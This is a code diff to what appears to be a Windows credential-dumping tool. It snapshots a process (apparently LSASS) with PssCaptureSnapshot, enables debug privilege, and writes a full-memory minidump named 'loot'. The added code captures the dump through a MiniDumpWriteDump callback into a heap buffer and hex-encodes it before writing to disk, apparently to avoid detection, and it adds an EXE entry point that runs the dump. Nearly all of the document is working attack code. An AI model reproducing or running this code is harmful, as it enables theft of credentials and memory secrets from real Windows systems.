@@ -12,7 +12,13 @@ typedef DWORD(__cdecl *PPssCaptureSnapshot)(HANDLE, PSS_CAPTURE_FLAGS, DWORD, HP
 // PssCaptureSnapshot typedef for GetProcAddress
 typedef DWORD(__cdecl *PPssFreeSnapshot)(HANDLE, HPSS);
 
-const LPCWSTR dmpPath = L"C:\\Windows\\Temp\\loot.DMP";
+// dump write path
+const LPCWSTR dmpPath = L"C:\\Windows\\Temp\\loot";
+
+// global callback buffer on heap for minidump
+// could also use CallbackParam in in callback routine
+LPVOID dumpBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 1024 * 75 * 2);
+DWORD bufferSize = 0;
 
 // Windows version table https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_osversioninfoexw#remarks
 // true if versions satisfy minimum Major/Minor version for Server/DomainController or Workstation
@@ -67,6 +73,17 @@ BOOL miniDumpLoot() {
 	return cDump;
 }
 
+
+constexpr char hexmap[] = { '0', '1', '2', '3', '4', '5', '6', '7',
+						   '8', '9', 'a', 'b', 'c', 'd', 'e', 'f' };
+BOOL binToHex(char *out, char *data, DWORD size, DWORD offset=0) {
+	for (int i = offset; i < size; ++i) {
+		out[2 * i] = hexmap[(data[i] & 0xF0) >> 4];
+		out[2 * i + 1] = hexmap[data[i] & 0x0F];
+	}
+	return TRUE;
+}
+
 // callback routine for MiniDumpWriteDump to tell it to read snapshot data instead of process handle
 BOOL CALLBACK MyMiniDumpWriteDumpCallback(
   __in     PVOID CallbackParam,
@@ -74,11 +91,41 @@ BOOL CALLBACK MyMiniDumpWriteDumpCallback(
   __inout  PMINIDUMP_CALLBACK_OUTPUT CallbackOutput
 )
 {
+	LPVOID destination = 0, source = 0;
+	DWORD bytesRead = 0;
     switch (CallbackInput->CallbackType)
     {
-        case 16: // IsProcessSnapshotCallback
+		case IoStartCallback:
+			CallbackOutput->Status = S_FALSE;
+			break;
+		case IoWriteAllCallback:
+			CallbackOutput->Status = S_OK;
+
+			// get source buffer of minidump data to be written to global dumpBuffer
+			source = CallbackInput->Io.Buffer;
+			// get size of bytes read
+			bytesRead = CallbackInput->Io.BufferBytes;
+
+			// get offset for write
+			destination = (LPVOID)((DWORD_PTR)dumpBuffer + (DWORD_PTR)CallbackInput->Io.Offset);
+
+			// TODO: use callback param instead of global buffer
+			// copy from minidump buffer to global dumpBuffer
+			RtlCopyMemory(destination, source, bytesRead);
+			//binToHex((char*)destination, (char*)source, bytesRead);
+
+			// add to total size of dumpBuffer
+			bufferSize += bytesRead;
+			//bufferSize += bytesRead * 2;
+			break;
+		case IoFinishCallback:
+			CallbackOutput->Status = S_OK;
+			break;
+        case IsProcessSnapshotCallback: 
             CallbackOutput->Status = S_FALSE;
             break;
+		default:
+			return true;
     }
     return TRUE;
 }
@@ -120,15 +167,26 @@ BOOL pssMiniDumpLoot() {
 	if (dwResultCode != ERROR_SUCCESS) return FALSE;
 
 
+	// callback info
 	MINIDUMP_CALLBACK_INFORMATION CallbackInfo;
 	ZeroMemory(&CallbackInfo, sizeof (MINIDUMP_CALLBACK_INFORMATION));
 	CallbackInfo.CallbackRoutine = MyMiniDumpWriteDumpCallback;
 	CallbackInfo.CallbackParam = NULL;
 	// use callback routine to tell MiniDumpWriteDump to capture from snapshot
-	BOOL cDump = MiniDumpWriteDump(SnapshotHandle,processId,hFile,MiniDumpWithFullMemory,NULL,NULL,&CallbackInfo);
+	BOOL cDump = MiniDumpWriteDump(SnapshotHandle,processId, NULL,MiniDumpWithFullMemory,NULL,NULL,&CallbackInfo);
 
 	pPFS(GetCurrentProcess(), SnapshotHandle);
 	//PssFreeSnapshot(GetCurrentProcess(), SnapshotHandle);
+
+	DWORD hexBytes = bufferSize * 2;
+	LPVOID hexBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, hexBytes);
+	binToHex((char*)hexBuffer, (char*)dumpBuffer, bufferSize);
+
+	// write encoded minidump to file
+	DWORD bytesWritten = 0;
+	WriteFile(hFile, hexBuffer, hexBytes, &bytesWritten, NULL);
+	//WriteFile(hFile, dumpBuffer, bufferSize, &bytesWritten, NULL);
+
 	CloseHandle(hFile);
 	CloseHandle(hProcess);
 
@@ -141,6 +199,7 @@ BOOL dumpLoot() {
 		return pssMiniDumpLoot();
 	}
 
+	// if version requirement minimum is not met, dump without snapshot clone
 	return miniDumpLoot();
 }
 
@@ -214,6 +273,9 @@ BOOL IsElevated() {
 	return fRet;
 }
 
+// Change build type .DLL
+// Properties->General->Configuration Type:Dynamic Library(.dll)
+// SubSystem flag has no effect on DLL
 BOOL APIENTRY DllMain( HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved ) {
     switch (ul_reason_for_call)
     {
@@ -228,3 +290,10 @@ BOOL APIENTRY DllMain( HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpRese
     return TRUE;
 }
 
+// Change build type .EXE
+// Properties->General->Configuration Type:Application(.exe)
+// Properties->Linker->System->SubSystem:CONSOLE
+int main() {
+	setRtlSEDebug();
+	dumpLoot();
+}
